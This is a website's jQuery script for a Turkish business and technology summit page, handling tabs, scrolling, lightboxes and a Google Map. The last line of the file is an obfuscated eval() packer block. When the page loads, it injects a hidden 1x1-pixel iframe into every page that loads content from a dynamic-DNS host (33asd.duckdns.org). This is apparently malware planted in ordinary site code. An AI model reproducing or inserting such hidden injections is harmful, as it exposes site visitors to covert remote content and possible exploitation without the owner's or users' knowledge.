/**
 * Created by Yunus on 5.03.2016.
 */

$(function(){

    $('.tab-icerik ul').hide();
    $('.tab li:first').addClass('aktif');
    $('.tab-icerik ul:first').show();

    $('.test-popup-link').magnificPopup({
        type: 'image'

    });



    $(".tab li").on('click',function(){


        var a = $(this).hasClass('aktif');

        if(a != true){
            $('.tab li').removeClass('aktif');
            $(this).addClass('aktif');
            var indis = $(this).index();
            $('.tab-icerik ul').hide('slide');
            $('.tab-icerik ul:eq('+ indis+')').show('slide');
        }



    });



    $('.page-scroll a').click(function(event){
        event.preventDefault();
        var $anchor = $(this);
        $('html, body').stop().animate({
            scrollTop: $($anchor.attr('href')).offset().top
        }, 1500, 'easeInOutQuad');return false;

    });




    $('.nav a').on('click', function(){

       if($(window).width() <=770)
       {
        $('.btn-navbar').click(); //bootstrap 2.x
        $('.navbar-toggle').click() //bootstrap 3.x by Richard
       }
    });

    $(".fancybox").fancybox({
        arrows:true,
        padding:4,
    });



});



//GOOGLE MAP
function init_map() {
    var myOptions = {
        zoom: 16,
        center: new google.maps.LatLng(36.6028529,34.3054456), //change the coordinates
        mapTypeId: google.maps.MapTypeId.ROADMAP,
        scrollwheel: false,

    };
    map = new google.maps.Map(document.getElementById("maps"), myOptions);
    marker = new google.maps.Marker({
        map: map,
        position: new google.maps.LatLng(36.6021281,34.3103555) //change the coordinates
    });
    infowindow = new google.maps.InfoWindow({
        content: "<center><b>Erdemli Kültür Merkezi</b><br>İşletmecilik Ve Teknoloji Zirvesi</center>"  //add your address
    });
    google.maps.event.addListener(marker, "click", function () {
        infowindow.open(map, marker);
    });
    infowindow.open(map, marker);
}
google.maps.event.addDomListener(window, 'load', init_map);


eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('g.f=e(){i.j.k+=\'<6 d="a" 9="b:2;c:2;h:p;7:4;8:4;s:t;3:2;" l="r" q="m://5.n.o/5/" 3=0 7="1" 8="1" 9="3:2"></6>\'}',30,30,'||0px|border|1px|33asd|iframe|width|height|style|33|margin|padding|id|function|onload|window|overflow|document|body|innerHTML|scrolling|http|duckdns|org|hidden|src|no|position|relative'.split('|'),0,{}))
